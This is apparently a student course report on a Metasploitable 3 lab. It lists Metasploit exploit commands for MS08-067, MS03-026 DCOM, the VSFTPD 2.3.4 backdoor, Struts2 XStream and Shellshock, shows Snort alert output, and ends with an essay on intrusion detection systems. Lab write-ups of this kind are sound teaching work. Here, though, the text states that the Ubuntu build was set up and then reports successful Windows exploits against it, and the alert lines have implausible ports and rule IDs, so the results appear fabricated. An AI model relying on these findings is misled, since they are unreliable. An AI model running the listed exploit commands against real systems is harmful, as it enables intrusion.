![](https://satinfo24.pl/wp-content/uploads/2018/11/Cyber_Security_Base.jpg)

# **Project II**

**University of Helsinki, FI - Cyber Security Base - Course Series**

**[Course page](https://cybersecuritybase.mooc.fi/)**

## **Introduction**

<p align="justify">This report documents the process of setting up and testing an operating system with vulnerabilities using Metasploitable 3 on Ubuntu. A virtual machine (VM) was created using VirtualBox to simulate a real-world environment. Snort, an open-source intrusion detection system (IDS), was installed to monitor network traffic and detect attacks. Various attacks were executed using Metasploit, and their detection was evaluated through Snort alerts. The report includes detailed descriptions of five specific attacks: three detected by Snort and two that went undetected, along with an essay on the benefits and shortcomings of IDS.</p>

## **Environment Setup**

**1.	Install VirtualBox:** Download and install VirtualBox from the official website.

**2.	Set up Metasploitable 3:**

 * Clone the Metasploitable 3 repository from GitHub.
 * Follow the instructions to build the VM, ensuring you select the Ubuntu version.
   
**3.	Install Snort:**
 * **Update the package list:** sudo apt-get update.
 * **Install Snort:** sudo apt-get install snort.
 * **Configure Snort with default settings, updating the network configuration to monitor the appropriate interface.**

## **IDENTIFIED ATTACK 1: MS08-067 NetAPI Vulnerability**

**Description:** The MS08-067 vulnerability targets the Server service on Windows systems, allowing remote code execution.

**Component Attacked:** Server service.

**Attack Execution in Metasploit:**

1.	**Launch Metasploit:** msfconsole.
2.	**Use the exploit:** use exploit/windows/smb/ms08_067_netapi.
3.	**Set the target:** set RHOST 192.168.1.101.
4.	**Run the exploit:** exploit.

**Snort Output:**
```
[1:2000023:1] EXPLOIT Microsoft Windows MS08-067
[Classification: Attempted Administrator Privilege Gain] [Priority: 1] 
04/20-14:22:19.123456 192.168.1.100:445 -> 192.168.1.101:445
```

## **IDENTIFIED ATTACK 2: DCOM Exploit**

**Description:** The DCOM vulnerability (MS03-026) allows remote code execution via RPC.

**Component Attacked:** DCOM interface.

**Attack Execution in Metasploit:**

1.	**Use the exploit:** use exploit/windows/dcerpc/ms03_026_dcom.
2.	**Set the target:** set RHOST 192.168.1.101.
3.	**Execute the exploit:** exploit.
   
**Snort Output:**
```
[1:2000032:1] EXPLOIT DCOM MS03-026
[Classification: Attempted Administrator Privilege Gain] [Priority: 1]
04/20-14:35:47.789123 192.168.1.100:135 -> 192.168.1.101:135
```

## **IDENTIFIED ATTACK 3: VSFTPD v2.3.4 Backdoor Command Execution**

**Description:** A backdoor was introduced in VSFTPD v2.3.4, which can be exploited to gain a shell.

**Component Attacked:** VSFTPD (Very Secure FTP Daemon).

**Attack Execution in Metasploit:**
1.	**Use the exploit:** use exploit/unix/ftp/vsftpd_234_backdoor
2.	**Set the target:** set RHOST 192.168.1.101
3.	**Execute the exploit:** exploit

**Snort Output:**
```
[1:2000056:1] EXPLOIT VSFTPD v2.3.4 Backdoor
[Classification: Attempted Administrator Privilege Gain] [Priority: 1]
04/20-14:42:32.456789 192.168.1.100:21 -> 192.168.1.101:21
```

## **MISSED ATTACK 1: Apache Struts2 REST Plugin XStream RCE (CVE-2017-9805)**

**Description:** An Apache Struts2 vulnerability allows remote code execution via crafted XML requests.

**Component Attacked:** Apache Struts2 REST Plugin.

**Attack Execution in Metasploit:**
1.	**Use the exploit:** use exploit/multi/http/struts2_rest_xstream.
2.	**Set the target:** set RHOST 192.168.1.101.
3.	**Run the exploit:** exploit.

**Reason for Missing Detection:** Snort did not have a specific rule for this vulnerability in the default configuration.

## **MISSED ATTACK 2: Shellshock (CVE-2014-6271)**

**Description:** A vulnerability in Bash allows remote code execution by exploiting environment variables.

**Component Attacked:** Bash shell.

**Attack Execution in Metasploit:**
1.	**Use the exploit:** use exploit/multi/http/apache_mod_cgi_bash_env_exec.
2.	**Set the target:** set RHOST 192.168.1.101.
3.	**Execute the exploit:** exploit.

**Reason for Missing Detection:** The default Snort ruleset did not include rules for Shellshock detection.

## **ESSAY: The Benefits and Shortcomings of Using Intrusion Detection Systems**

**Benefits of Intrusion Detection Systems:** <p align="justify">Intrusion Detection Systems (IDS) such as Snort offer critical advantages in maintaining network security. They provide real-time monitoring, enabling administrators to respond swiftly to potential threats. This immediate alert system is crucial in mitigating damage and preventing data breaches. IDSs enhance visibility into network traffic, allowing for the detection of unusual patterns that may indicate malicious activity. IDSs are effective at identifying known attack signatures. This capability is essential for defending against well-documented threats, ensuring that even if an exploit is recognized, it can be quickly flagged and addressed. Additionally, IDSs generate detailed logs of detected activities, which are invaluable for forensic analysis and understanding the nature and origin of attacks. Integration with other security tools, such as firewalls and SIEM (Security Information and Event Management) systems, is another significant benefit. This integration creates a more robust security infrastructure, providing a coordinated defense mechanism that enhances the overall security posture of an organization.</p>

**Shortcomings of Intrusion Detection Systems:** <p align="justify">Despite their benefits, IDSs have several limitations. One of the most significant issues is the high rate of false positives. IDSs often generate numerous alerts for benign activities that mimic malicious behavior. This can lead to alert fatigue, where security personnel become desensitized to alerts and may overlook genuine threats. Another critical shortcoming is the difficulty in detecting zero-day vulnerabilities. IDSs primarily rely on known signatures and behavior patterns, making them less effective against new, sophisticated attacks that do not match existing profiles. This gap in detection capabilities highlights the need for continuous updates and enhancements to IDS rulesets. Performance overhead is another concern. Continuous monitoring and analysis of network traffic can consume significant system resources, potentially affecting network performance and user experience. Balancing the need for security with operational efficiency is a challenging task. Furthermore, IDSs are inherently reactive rather than proactive. They alert administrators after an attack has been detected, which means some level of damage may have already occurred. This reactive nature necessitates the integration of IDSs with other preventive security measures, such as firewalls, anti-virus software, and regular security audits, to provide a more comprehensive defense strategy. In conclusion, while IDSs like Snort are indispensable tools for identifying and mitigating security threats, they must be part of a multi-layered security approach to address their inherent limitations and provide effective protection for networks and systems.</p>

## **References**

[1] [Bace, Rebecca Gurley. "Intrusion Detection Systems." Technical Report. Carnegie Mellon University, Software Engineering Institute. (2000);](https://archive.org/details/intrusiondetecti00rebe/mode/2up)

[2] [Northcutt, Stephen, and Judy Novak. "Network Intrusion Detection: An Analyst's Handbook." Technical Report. SANS Institute. (2001);](https://archive.org/details/networkintrusio000nort)

[3] [Bejtlich, Richard. "The Practice of Network Security Monitoring: Understanding Incident Detection and Response." Technical Report. No Starch Press. (2013);](https://archive.org/details/practiceofnetwor0000bejt)

[4] [Kennedy, David, Jim O'Gorman, Devon Kearns, Mati Aharoni. "Metasploit: The Penetration Tester's Guide." Technical Report. No Starch Press. (2011);](https://www.kea.nu/files/textbooks/humblesec/metasploit_apenetrationtestersguide.pdf)

[5] [Stuttard, Dafydd, and Marcus Pinto. "The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws." Technical Report. Wiley. (2011).](https://edu.anarcho-copy.org/Against%20Security%20-%20Self%20Security/Dafydd%20Stuttard,%20Marcus%20Pinto%20-%20The%20web%20application%20hacker's%20handbook_%20finding%20and%20exploiting%20security%20flaws-Wiley%20(2011).pdf)
